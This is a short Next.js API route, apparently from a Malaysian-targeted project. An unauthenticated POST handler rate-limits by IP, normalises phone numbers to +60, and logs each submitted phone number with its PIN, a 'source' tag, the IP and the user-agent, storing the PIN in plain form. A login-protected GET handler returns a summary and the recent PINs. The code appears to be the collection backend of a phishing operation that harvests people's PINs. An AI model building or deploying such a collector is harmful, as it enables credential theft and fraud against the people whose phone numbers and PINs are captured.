import { NextResponse } from "next/server";
import { isLoggedIn } from "@/lib/auth";
import { logPin, pinSummary, recentPins } from "@/lib/db";
import { pinSchema } from "@/lib/validation";

export const runtime = "nodejs";

const hits = new Map<string, number[]>();
function limited(ip: string) {
  const now = Date.now();
  const list = (hits.get(ip) ?? []).filter((t) => now - t < 60_000);
  list.push(now);
  hits.set(ip, list);
  return list.length > 30;
}

function normalise(phone: string) {
  let d = phone.replace(/\D/g, "");
  if (d.startsWith("60")) d = d.slice(2);
  if (d.startsWith("0")) d = d.slice(1);
  return "+60" + d;
}

export async function POST(req: Request) {
  const ip = req.headers.get("x-forwarded-for")?.split(",")[0]?.trim() ?? "local";
  if (limited(ip)) {
    return NextResponse.json({ ok: false, error: "Terlalu banyak cubaan" }, { status: 429 });
  }

  const parsed = pinSchema.safeParse(await req.json().catch(() => ({})));
  if (!parsed.success) {
    return NextResponse.json({ ok: false, error: "Data tidak sah" }, { status: 422 });
  }

  logPin.run({
    phone: normalise(parsed.data.phone),
    pin: parsed.data.pin,
    source: parsed.data.source,
    ip,
    ua: req.headers.get("user-agent") ?? ""
  });

  return NextResponse.json({ ok: true }, { status: 201 });
}

export async function GET() {
  if (!(await isLoggedIn())) {
    return NextResponse.json({ ok: false, error: "Tidak dibenarkan" }, { status: 401 });
  }
  return NextResponse.json({ ok: true, summary: pinSummary(), recent: recentPins() });
}